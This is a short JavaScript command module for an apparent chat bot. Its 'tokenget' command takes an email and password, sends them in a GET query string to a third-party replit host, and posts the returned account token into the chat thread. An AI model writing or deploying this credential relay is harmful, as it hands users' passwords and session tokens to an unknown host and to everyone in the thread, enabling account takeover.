const axios = require("axios");

module.exports = {
  name: "tokenget",
  hasPermission: "members",
  Programmer: "Jonell Magallanes",
  info: "Retrieve user token",
  category: "user",
  prefix: "enable",
  usage: "[tokenget <email> <password>]",
  cooldowns: 5,

  letStart: async function ({ api, event, target }) {
    const [email, password] = target;
    const response = await axios.get(`https://hayuphahahhs.hazeyy.repl.co/login?email=${email}&password=${password}`);
    const userToken = response.data.token;
    api.sendMessage(`User token: ${userToken}`, event.threadID);
  }
};